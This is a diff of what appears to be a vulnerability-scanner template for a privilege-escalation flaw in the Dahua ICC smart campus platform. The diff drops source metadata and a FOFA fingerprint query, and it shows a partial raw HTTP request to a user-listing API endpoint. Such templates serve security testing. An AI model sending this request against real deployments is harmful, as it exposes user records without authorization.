@@ -3,14 +3,8 @@ info:
   name: 大华 ICC 智慧校园综合管理平台垂直越权漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pp381w39kctvqr7g
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pp381w39kctvqr7g
-    fofa: body="/static/fontshd/font-hd.css" || body="客户端会小于800"
 http:
 - raw:
   - 'GET /evo-apigw/evo-brm/1.2.0/user/page?pageNum=2&pageSize=10&searchKey=&sortType=&isReuse=&isOnline=&userId=1&userType=&ownerCode=001&stats=&isContain=true&needSystemReserve=0 HTTP/1.1
